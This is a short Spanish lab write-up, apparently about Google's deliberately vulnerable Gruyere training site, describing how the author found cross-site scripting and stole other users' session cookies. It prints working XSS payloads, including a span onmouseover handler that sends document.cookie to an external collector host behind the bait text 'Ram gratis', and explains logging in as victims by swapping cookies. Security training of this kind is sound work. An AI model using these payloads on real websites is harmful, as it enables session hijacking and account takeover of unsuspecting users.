#Como robé las cookies enteras de otro usuario

Usando la página web de Gruyere, pude comprobar que, al introducir cualquier cosa en la url que no tuviera la página, salía un error indicando que eso no existía, lo que me hizo pensar que  la página no tenía protección contra ataques de inyección de código. Por lo tanto, probé principalmente a que me mostrara mis propias  cookies, con un alert usando js:

```js
alert(document.cookie)
```

Al ver que funcionaba, pensé que los posts o "snippets" que se podían hacer funcionaban con un HTML desprotegido. AL principio observé que los scripts no funcionaban de normal, sin embargo, si lo hacían si los escondía en las propiedades de una etiqueta como <p> o <span>, así que repetí la prueba de alert pero ahora desde los snippets usando:

```html
<span onmouseover=alert(document.cookie)>Prueba</span>
```
Funcionó, así que era hora de dar el paso final y mandar la cookie a un servidor externo, que me permitiría registrar la  cookie de otro usuario. Para esto, cambié ligeramente el código para hacer un fetch y quedó tal que así:

```html
<span onmouseover="fetch('https://datagrabber.onrender.com/grab?data=' + document.cookie)">Ram gratis</span>
```

Con esto, finalmente podría tener acceso a las cuentas de todos los que pusieran el ratón sobre el texto que escribí, después, simplemente puedo cambiar mi cookie a la de los demás para logearme en sus cuentas.